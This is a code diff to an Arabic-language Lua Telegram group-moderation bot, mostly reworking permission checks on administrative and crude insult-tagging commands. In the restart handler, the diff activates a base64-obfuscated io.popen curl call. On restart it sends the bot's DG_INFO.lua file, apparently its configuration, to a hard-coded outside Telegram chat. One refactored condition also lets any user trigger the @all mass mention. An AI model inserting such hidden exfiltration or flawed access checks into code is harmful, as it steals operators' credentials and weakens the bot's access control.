-elseif text == 'فتح التثبيت' and msg.reply_to_message_id_ == 0 then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
-return false
-end 
+elseif text == 'فتح التثبيت' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
 database:del(bot_id.."lockpin"..msg.chat_id_)  
 database:srem(bot_id..'lock:pin',msg.chat_id_)
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فـتح التثبيت ')
 end,nil)   
-elseif text == 'فتح التعديل' and msg.reply_to_message_id_ == 0 then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
-return false
-end 
+elseif text == 'فتح التعديل' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
 database:del(bot_id..'lock:edit'..msg.chat_id_) 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فـتح تعديل ')
@@ -5043,11 +5023,7 @@ database:del(bot_id..'lock:Engilsh'..msg.chat_id_)
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فـتح الانكليزيه ')
 end,nil)
-elseif text == 'فتح تعديل الميديا' and msg.reply_to_message_id_ == 0 then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
-return false
-end 
+elseif text == 'فتح تعديل الميديا' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
 database:del(bot_id..'lock_edit_med'..msg.chat_id_) 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فـتح تعديل ')
@@ -5223,11 +5199,7 @@ Text = '\n ☉┇ بالتاكيد تم تعطيل نسبه الانوثه'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تفعيل all' then
-if not CoSu(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
-return false
-end   
+if text == 'تفعيل all' and CoSu(msg) then   
 if database:get(bot_id..'Cick:all'..msg.chat_id_) then
 Text = ' ☉┇ تم تفعيل امر @all'
 database:del(bot_id..'Cick:all'..msg.chat_id_)  
@@ -5236,11 +5208,7 @@ Text = ' ☉┇ بالتاكيد تم تفعيل امر @all'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل all' then
-if not CoSu(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
-return false
-end  
+if text == 'تعطيل all' and CoSu(msg) then  
 if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
 database:set(bot_id..'Cick:all'..msg.chat_id_,true)  
 Text = '\n ☉┇ تم تعطيل امر @all'
@@ -5249,58 +5217,7 @@ Text = '\n ☉┇ بالتاكيد تم تعطيل امر @all'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تفعيل قول' then
-if not CoSu(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
-return false
-end  
-if database:get(bot_id..'Speak:after:me'..msg.chat_id_) then
-Text = ' ☉┇ تم تفعيل امر قول'
-database:del(bot_id..'Speak:after:me'..msg.chat_id_)  
-else
-Text = ' ☉┇ بالتاكيد تم تفعيل امر قول'
-end
-send(msg.chat_id_, msg.id_,Text) 
-end
-if text == 'تعطيل قول' then
-if not CoSu(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
-return false
-end  
-if not database:get(bot_id..'Speak:after:me'..msg.chat_id_) then
-database:set(bot_id..'Speak:after:me'..msg.chat_id_,true)  
-Text = '\n ☉┇ تم تعطيل امر قول'
-else
-Text = '\n ☉┇ بالتاكيد تم تعطيل امر قول'
-end
-send(msg.chat_id_, msg.id_,Text) 
-end
-if text == 'تفعيل غنيلي' then   
-if not CoSu(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
-return false
-end  
-if database:get(bot_id..'sing:for:me'..msg.chat_id_) then
-Text = ' ☉┇ تم تفعيل امر غنيلي الان ارسل غنيلي'
-database:del(bot_id..'sing:for:me'..msg.chat_id_)  
-else
-Text = ' ☉┇ بالتاكيد تم تفعيل امر غنيلي تستطيع ارسال غنيلي'
-end
-send(msg.chat_id_, msg.id_,Text) 
-end
-if text == 'تعطيل غنيلي' then   
-if not CoSu(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
-return false
-end  
-if not database:get(bot_id..'sing:for:me'..msg.chat_id_) then
-database:set(bot_id..'sing:for:me'..msg.chat_id_,true)  
-Text = '\n ☉┇ تم تعطيل امر غنيلي'
-else
-Text = '\n ☉┇ بالتاكيد تم تعطيل امر غنيلي'
-end
-send(msg.chat_id_, msg.id_,Text) 
-end
+
 if text == 'قفل التاك' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
 database:set(bot_id.."lock:hashtak"..msg.chat_id_,'del')  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
@@ -5777,7 +5694,7 @@ return false
 end    
 send(msg.chat_id_, msg.id_, ' ☉┇ تم اعاده تشغيل البوت') 
 dofile('DRAGON.lua')  
---io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
+io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 end 
 if text == ("مسح الحظر العام") then
 if not DevSoFi(msg) then
@@ -6249,11 +6166,7 @@ echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ الــدخـ
 echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ مـده تـشغيـل الـسـيـرفـر } ⊰•  \n*»» '"$uptime"'*'
 ]]):read('*all'))  
 end
-if text == "all" or text == "@all" then
-if not CoSu(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
-return false
-end
+if text == "all" or text == "@all" and CoSu(msg) then
 if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
 if database:get(bot_id.."S00F4:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
 return 
@@ -7091,11 +7004,7 @@ Reply_Status(msg,msg.sender_user_id_,"reply","☉┇ قام بنشر صوره ا
 DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
 end   
 end
-if text == 'تفعيل التحويل' then
-if not CoSu(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
-return false
-end   
+if text == 'تفعيل التحويل' and CoSu(msg) then   
 if database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then
 Text = 'تم تفعيل تحويل الصيغ'
 database:del(bot_id..'DRAGOON:change:sofi'..msg.chat_id_)  
@@ -7104,11 +7013,7 @@ Text = ' ☉┇ بالتاكيد تم تفعيل امر تحويل'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل التحويل' then
-if not CoSu(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
-return false
-end  
+if text == 'تعطيل التحويل' and CoSu(msg) then  
 if not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then
 database:set(bot_id..'DRAGOON:change:sofi'..msg.chat_id_,true)  
 Text = '\n ☉┇ تم تعطيل امر تحويل'
@@ -7163,20 +7068,12 @@ end
 end
 -------------------
 ------------------------------------------------------------------------
-if text == ("مسح الاساسين") then
-if not CoSu(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
-return false
-end
+if text == ("مسح الاساسين") and CoSu(msg) then
 database:del(bot_id..'Basic:Constructor'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, '\n ☉┇ تم مسح المنشئين الاساسين')
 return false
 end
-if text == 'المنشئين الاساسين' then
-if not CoSu(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
-return false
-end
+if text == 'المنشئين الاساسين' and CoSu(msg) then
 local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
 t = "\n ☉┇ قائمة المنشئين الاساسين \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -7210,11 +7107,7 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 
-if text == ("رفع منشئ اساسي") and msg.reply_to_message_id_ then
-if not CoSu(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
-return false
-end
+if text == ("رفع منشئ اساسي") and msg.reply_to_message_id_ and CoSu(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -7288,11 +7181,7 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-if text == ("تنزيل منشئ اساسي") and msg.reply_to_message_id_ then
-if not CoSu(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
-return false
-end
+if text == ("تنزيل منشئ اساسي") and msg.reply_to_message_id_ and CoSu(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -7363,21 +7252,13 @@ end;end,nil)
 return false
 end
 ------------------------------------------------------------------------
-if text == 'مسح المنشئين' then
-if not BasicConstructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ الاساسي لاستخدام هذا الامر')
-return false
-end
+if text == 'مسح المنشئين' and BasicConstructor(msg) then
 database:del(bot_id..'Constructor'..msg.chat_id_)
 texts = ' ☉┇ تم مسح المنشئين '
 send(msg.chat_id_, msg.id_, texts)
 end
 
-if text == ("المنشئين") then
-if not BasicConstructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ الاساسي لاستخدام هذا الامر')
-return false
-end
+if text == ("المنشئين") and BasicConstructor(msg) then
 local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
 t = "\n ☉┇ قائمة المنشئين \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -7427,11 +7308,7 @@ end
 end
 end,nil)   
 end
-if text == "رفع منشئ" and msg.reply_to_message_id_ then
-if not BasicConstructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ الاساسي لاستخدام هذا الامر')
-return false
-end
+if text == "رفع منشئ" and msg.reply_to_message_id_ and BasicConstructor(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -7503,11 +7380,7 @@ status  = '\n ☉┇ تم ترقيته منشئ'
 send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 end
-if text and text:match("^تنزيل منشئ$") and msg.reply_to_message_id_ then
-if not BasicConstructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ الاساسي لاستخدام هذا الامر')
-return false
-end
+if text and text:match("^تنزيل منشئ$") and msg.reply_to_message_id_ and BasicConstructor(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -7577,20 +7450,12 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 end
 ------------------------------------------------------------------------
-if text == 'مسح المدراء' then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
-return false
-end
+if text == 'مسح المدراء' and Constructor(msg) then
 database:del(bot_id..'Manager'..msg.chat_id_)
 texts = ' ☉┇ تم مسح المدراء '
 send(msg.chat_id_, msg.id_, texts)
 end
-if text == ("المدراء") then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
-return false
-end
+if text == ("المدراء") and Constructor(msg) then
 local list = database:smembers(bot_id..'Manager'..msg.chat_id_)
 t = "\n ☉┇ قائمة المدراء \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -7622,11 +7487,7 @@ t = " ☉┇ لا يوجد مدراء"
 end
 send(msg.chat_id_, msg.id_, t)
 end
-if text == ("رفع مدير") and msg.reply_to_message_id_ then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
-return false
-end
+if text == ("رفع مدير") and msg.reply_to_message_id_ and Constructor(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -7701,11 +7562,7 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end  
-if text == ("تنزيل مدير") and msg.reply_to_message_id_ then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
-return false
-end
+if text == ("تنزيل مدير") and msg.reply_to_message_id_ and Constructor(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8149,19 +8006,11 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-if text == 'مسح المدراء الثانين' then
-if not BasicConstructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ الاساسي لاستخدام هذا الامر')
-return false
-end
+if text == 'مسح المدراء الثانين' and BasicConstructor(msg) then
 database:del(bot_id..'S00F4:MN:TF'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح المدير ثانيين')
 end
-if text == ("المدراء الثانين") then
-if not BasicConstructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ الاساسي لاستخدام هذا الامر')
-return false
-end
+if text == ("المدراء الثانين") and BasicConstructor(msg) then
 local list = database:smembers(bot_id..'S00F4:MN:TF'..msg.chat_id_)
 t = "\n ☉┇ قائمة المدير ثانيين \n≪━━━━━━𝓓𝓡𝓖━━━━━━≫\n"
 for k,v in pairs(list) do
@@ -8177,11 +8026,7 @@ t = " ☉┇ لا يوجد المدير ثانيين"
 end
 send(msg.chat_id_, msg.id_, t)
 end
-if text == ("رفع مدير ثاني") and msg.reply_to_message_id_ then
-if not BasicConstructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ الاساسي لاستخدام هذا الامر')
-return false
-end
+if text == ("رفع مدير ثاني") and msg.reply_to_message_id_ and BasicConstructor(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8267,11 +8112,7 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-if text == ("تنزيل مدير ثاني") and msg.reply_to_message_id_ then
-if not BasicConstructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ الاساسي لاستخدام هذا الامر')
-return false
-end
+if text == ("تنزيل مدير ثاني") and msg.reply_to_message_id_ and BasicConstructor(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8701,10 +8542,18 @@ return false
 end  
 ------------------------------------------------------------------------
 if text == 'تنزيل المطايه' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Mote:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح جميع المطايه')
 end
 if text == ("تاك للمطايه") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Mote:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة مطايه الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -8722,6 +8571,10 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع مطي") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8748,6 +8601,10 @@ return false
 end
 
 if (text == ("تنزيل مطي")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8770,10 +8627,18 @@ return false
 end
 -----------------------------------------------------
 if text == 'مسح المتزوجين' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Mode:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح جميع المتزوجين')
 end
 if text == ("تاك للمتزوجين") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
 t = "\n ☉┇ قائمه ازواج الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -8791,6 +8656,10 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("زواج") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8817,6 +8686,10 @@ return false
 end
 
 if (text == ("طلاق")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8839,10 +8712,18 @@ return false
 end
 -----------------------------------------------------
 if text == 'مسح الخولات' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Modde:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح كل الخولات')
 end
 if text == ("تاك للخولات") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Modde:User'..msg.chat_id_)
 t = "\n ☉┇ قائمه خولات الجروب \nٴ•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•ٴ\n"
 for k,v in pairs(list) do
@@ -8860,6 +8741,10 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع خول") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8886,6 +8771,10 @@ return false
 end
 
 if (text == ("تنزيل خول")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8908,10 +8797,18 @@ return false
 end
 -----------------------------------------------------
 if text == 'تنزيل الصخوله' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Sakl:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم تنزيل جميع صخوله من الجروب')
 end
 if text == ("تاك للصخوله") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Sakl:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة صخوله الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -8929,6 +8826,10 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع صخل") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8956,6 +8857,10 @@ end
 
 
 if (text == ("تنزيل صخل")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8978,10 +8883,18 @@ return false
 end
 -----------------------------------------------------
 if text == 'مسح الكلاب' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Motte:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسج كل كلاب الجروب')
 end
 if text == ("تاك للكلاب") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Motte:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة كلاب الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -8999,6 +8912,10 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع كلب") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9025,6 +8942,10 @@ return false
 end
 
 if (text == ("تنزيل كلب")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9047,10 +8968,18 @@ return false
 end
 -----------------------------------------------------
 if text == 'تنزيل القروده' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Motee:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم تنزيل جميع القروده بالجروب')
 end
 if text == ("تاك للقروده") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Motee:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة القروده الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -9068,6 +8997,10 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع قرد") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9094,6 +9027,10 @@ return false
 end
 
 if (text == ("تنزيل قرد")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9116,10 +9053,18 @@ return false
 end
 -----------------------------------------------------
 if text == 'تنزيل الضلوع' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Bro:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم تنزيل جميع الضلوع بالجروب')
 end
 if text == ("تاك للضلوع") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Bro:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة الضلوع الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -9137,6 +9082,10 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع ضلع") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9163,6 +9112,10 @@ return false
 end
 
 if (text == ("تنزيل ضلع")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9185,10 +9138,18 @@ return false
 end
 -----------------------------------------------------
 if text == 'مسح النسوان' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Girl:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح كل النسوان بالجروب')
 end
 if text == ("تاك للنسوان") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Girl:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة نسوان الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -9206,6 +9167,10 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع مره") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9232,6 +9197,10 @@ return false
 end
 
 if (text == ("تنزيل مره")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9254,10 +9223,18 @@ return false
 end
 -----------------------------------------------------
 if text == 'مسح المتناكين' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Nek:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح كل متناكين الجروب')
 end
 if text == ("تاك للمتناكين") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Nek:User'..msg.chat_id_)
